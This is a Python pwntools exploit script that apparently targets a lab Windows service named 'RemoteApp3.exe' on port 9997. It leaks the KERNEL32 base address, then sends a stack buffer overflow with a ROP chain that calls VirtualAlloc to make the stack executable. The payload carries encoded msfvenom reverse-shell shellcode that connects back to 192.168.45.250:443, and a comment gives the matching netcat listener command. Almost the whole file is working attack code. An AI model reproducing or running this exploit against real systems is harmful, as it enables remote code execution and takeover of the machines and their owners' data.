#!/usr/bin/python3

from struct import pack
import pwn
import sys

pwn.context.log_level = "WARNING"

# for RemoteApp3.exe; TCPView => listens on port 9997
SERVER, PORT = None, 9997

def main() :
    global SERVER ; SERVER = sys.argv[1]
    kernel32 = leak(opcode=901, libname="KERNEL32.dll")
    exploit(kernel32)


def leak(opcode, libname):
    buf    = pack("<I", opcode) + libname.encode()
    addr   = parseAddress(sendPayload(wrapPayload(buf)), libname.encode())
    print(f"[+] Leaked address of {libname}: 0x{addr:x}")
    return addr

def wrapPayload(payload):
    """Pass checks / restrictions on input"""
    # note: there are no bad chars
    buf  = b""
    buf += pack("<I", 0xDEADBEEF)
    buf += pack("<I", 0xC0DECAFE)
    buf += pack("<I", 0xD0D0FACE)
    buf += b"AAAA"
    buf += b"BBBB"
    buf += b"CCCC"
    buf += b"DDDD"
    buf += payload
    return buf

def sendPayload(buf):
    p = pwn.remote(SERVER, PORT)
    p.recvuntil(b"Welcome to RemoteApp3 |").decode()
    p.send(buf)
    output = p.recvall(timeout=1)
    p.close()
    return output

def parseAddress(buf, libname):
    return int(buf.split(libname + b": ")[1].split(b"[")[0], 16)

size = 0xa00 ; offBufEip = 0x9b0+4
def exploit(kernel32):
    # arbitrary splits for structure of the input buffer
    offBufShellcode        = offBufEip - 0x500
    offBufVirtualallocstub = offBufEip - len(virtualAllocStub())

    badchars = b"\x0a\x0b\x0c\x0d\xa1\xa2\xa3\xa4\xb1\xb2\xb3\xb4\xf1\xf2\xf3\xf4"
    # buf += bytes([ b for b in range(0x100)
    #                  if b not in badchars])

    buf  = b""
    buf += pack("<I", 903)                              # opcode

    buf += nopsledRop(kernel32, 0x20)
    buf += ropChainVirtualAlloc(kernel32)

    tmpPaddingSize1 = offBufShellcode - len(buf)
    assert tmpPaddingSize1 >= 0
    buf += b"a" * tmpPaddingSize1

    buf += nopsled()
    buf += shellcode()

    tmpPaddingSize2 = offBufVirtualallocstub - len(buf)
    assert tmpPaddingSize2 >= 0
    buf += b"b" * tmpPaddingSize2

    buf += virtualAllocStub(kernel32)

    buf += ropChainBackJump(kernel32)                   # saved EIP is overwritten here

    buf += b"z" * (size - len(buf))

    assert len(buf) == size
    for b in badchars: assert b not in buf, print(f"{repr(chr(b))} 0x{b:x}", pwn.hexdump(buf))
    sendPayload(wrapPayload(buf))
    print("[+] Sent exploit; reverse shell should be incoming")

def virtualAllocStub(kernel32=0):
    offKernel32Virtualalloc = 0x238c0
    buf  = b""
    buf += pack("<I", kernel32+offKernel32Virtualalloc) # Address of VirtualAlloc
    buf += b"BBBB"                                      # Return address (shellcode address on stack)
    buf += b"CCCC"                                      # lpAddress (shellcode address on stack)
    buf += pack("<I", 0x1000)                           # dwSize (a page should be enough)
    buf += pack("<I", 0x1000)                           # flAllocationType (0x1000=MEM_COMMIT)
    buf += pack("<I", 0x40)                             # flProtect (0x40=PAGE_EXECUTE_READWRITE)
    return buf

def ropChainBackJump(kernel32=0):
    buf  = b""
    buf += pack("<I", kernel32 + 0x6fa2f)               # push esp ; pop esi ; ret
    buf += pack("<I", kernel32 + 0x68090)               # mov eax, esi ; pop esi
    buf += b"jjjj"                                      # junk
    buf += pack("<I", kernel32 + 0x742ae)               # pop ebp
    buf += pack("<i", -(offBufEip - 0x10))
    buf += pack("<I", kernel32 + 0x38ec5)               # add eax, ebp
    buf += pack("<I", kernel32 + 0x6db79)               # xchg eax, esp
    return buf

def ropChainVirtualAlloc(kernel32=0):
    buf  = b""

    # align ecx with shellcode address
    offEaxShellcode = -0x51c
    buf += pack("<I", kernel32 + 0x742ae)               # pop ebp
    buf += pack("<i", offEaxShellcode)
    buf += pack("<I", kernel32 + 0x38ec5)               # add eax, ebp
    buf += pack("<I", kernel32 + 0x19a3d)               # mov ecx, eax ; mov eax, ecx ; pop ebp
    buf += b"jjjj"                                      # junk


    # align eax with return address of VirtualAlloc on stack
    offEaxRetaddrslot = 0x4ec
    buf += pack("<I", kernel32 + 0x742ae)               # pop ebp
    buf += pack("<i", offEaxRetaddrslot)
    buf += pack("<I", kernel32 + 0x38ec5)               # add eax, ebp

    # patch return address on stack
    buf += pack("<I", kernel32 + 0x1cc9b)               # mov  [eax], ecx ; pop ebp ; retn 0x0008
    buf += b"jjjj"                                      # junk
    buf += pack("<I", kernel32 + 0xfe7b)                # ret
    buf += b"j" * 8                                     # junk

    # align eax with lpAddress on stack
    buf += pack("<I", kernel32 + 0xee5f) * 4            # inc eax

    # patch lpAddress on stack
    buf += pack("<I", kernel32 + 0x1cc9b)               # mov  [eax], ecx ; pop ebp ; retn 0x0008
    buf += b"jjjj"                                      # junk
    buf += pack("<I", kernel32 + 0xfe7b)                # ret
    buf += b"j" * 8                                     # junk

    # align eax with call to VirtualAlloc
    offEaxVirtualallocstub = -0x8
    buf += pack("<I", kernel32 + 0x742ae)               # pop ebp
    buf += pack("<i", -0x8)
    buf += pack("<I", kernel32 + 0x38ec5)               # add eax, ebp

    # buf += pack("<I", kernel32 + 0x6dd00)             # int3 (debug gadget)

    # 0:003> dds @eax l6
    # 0115dec8  775438c0 KERNEL32!VirtualAllocStub
    # 0115decc  0115d9e0
    # 0115ded0  0115d9e0
    # 0115ded4  00001000
    # 0115ded8  00001000
    # 0115dedc  00000040

    # actually stack pivot
    buf += pack("<I", kernel32 + 0x6db79)               # xchg eax, esp

    return buf

def nopsled(length=0x10):
    return b"\x90" * length

def nopsledRop(kernel32, length=0x10):
    return pack("<I", kernel32 + 0xfe7b) * length       # ret

def shellcode():
    buf  = b""
    # buf += b"\xcc\x90\x90\x90"                        # int3 / debugging

    buf += b"\x81\xec\x00\x05\x00\x00\x90\x90"          # pwn.asm("sub esp, 0x300 ; nop ; nop"); make space for decoder

    # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.250 LPORT=443 -f python -b "\x0a\x0b\x0c\x0d\xa1\xa2\xa3\xa4\xb1\xb2\xb3\xb4\xf1\xf2\xf3\xf4"
    # nc -vlnp 443
    buf += b"\xeb\x23\x5b\x89\xdf\xb0\xd1\xfc\xae\x75\xfd\x89"
    buf += b"\xf9\x89\xde\x8a\x06\x30\x07\x47\x66\x81\x3f\x34"
    buf += b"\x43\x74\x08\x46\x80\x3e\xd1\x75\xee\xeb\xea\xff"
    buf += b"\xe1\xe8\xd8\xff\xff\xff\x3e\x1d\x15\x10\xd1\xc2"
    buf += b"\xf5\x97\x10\x3e\x1d\x75\x99\xdb\x2c\xd5\x74\xb5"
    buf += b"\x4d\x25\x9b\x6c\x11\x9e\x42\x2a\x96\x67\x38\x31"
    buf += b"\xaa\x5f\x36\x0f\xe2\xb9\x2c\x5f\x61\x17\x3c\x1e"
    buf += b"\xdc\xda\x1d\x3f\xda\xf7\xe2\x6c\x4a\x9e\x42\x2e"
    buf += b"\x96\x5f\x2c\xb5\x51\x04\x68\xdd\x55\x14\xc1\x6f"
    buf += b"\x96\x4c\x30\x3f\xce\x9e\x59\x26\xfe\x2f\x59\xb5"
    buf += b"\x29\x9e\x11\xe8\x2c\xea\xbc\xff\xd2\x18\x11\xf9"
    buf += b"\x25\xf5\x65\xc8\x1e\x68\xe8\x05\x60\x31\x65\xda"
    buf += b"\x45\x9e\x48\x1a\x1c\xc6\x76\xb5\x11\x5e\x9b\x66"
    buf += b"\x01\x14\xc3\xb5\x19\x9e\x11\xee\x94\x51\x34\x1a"
    buf += b"\x46\x4e\x71\x67\x47\x44\xef\xde\x42\x4a\x4a\xb5"
    buf += b"\x0f\xfe\x9d\x63\x75\x26\x22\x3e\x1d\x7d\x67\x4d"
    buf += b"\x2f\x4a\x44\x56\x51\x62\x36\x39\xe2\xc0\xa8\xae"
    buf += b"\x1c\x15\x10\x17\xd9\x41\x40\x56\x34\x95\x7b\x3e"
    buf += b"\xe2\xc0\x40\x6e\x4d\x45\x50\x6e\x5d\x45\x78\xd4"
    buf += b"\x12\xca\xf0\xc1\xc8\x82\x7a\x3b\x75\xd5\xb8\x13"
    buf += b"\xe7\x7d\x12\x3e\x1c\xae\x99\xd8\x77\x05\x46\x69"
    buf += b"\x75\x8c\xb5\x4a\x7c\xea\xc5\xbb\xdd\x61\x1c\xc1"
    buf += b"\x53\x1d\x65\xd2\x75\xe5\xa5\x9c\x4b\xea\xc5\x56"
    buf += b"\x7e\x78\x74\x3e\x94\xf6\x47\x69\x4a\x24\xe6\x54"
    buf += b"\x0f\x4c\x46\xdc\xe0\x73\xd7\x7a\x39\x29\x11\x3f"
    buf += b"\x90\x51\x34\x2e\xdb\x15\x54\x6a\x4d\x43\x46\x68"
    buf += b"\x5b\x43\x5e\x68\x4b\x46\x46\x56\x64\xd9\x2f\xb8"
    buf += b"\xe2\xc0\x99\xde\x53\x43\x56\xc1\x2d\x7d\x18\xb9"
    buf += b"\x00\x75\xef\xeb\xa6\xe5\xa5\x9c\x4b\x7d\xb6\xab"
    buf += b"\xa0\x88\xef\xeb\x21\x13\x6c\x34\x9d\xee\xf0\x4b"
    buf += b"\x18\xae\x57\x2d\x6f\x7a\x7a\x3e\x4e\xea\xc5\x34"
    buf += b"\x43"

    return buf

if __name__ == "__main__":
    main()
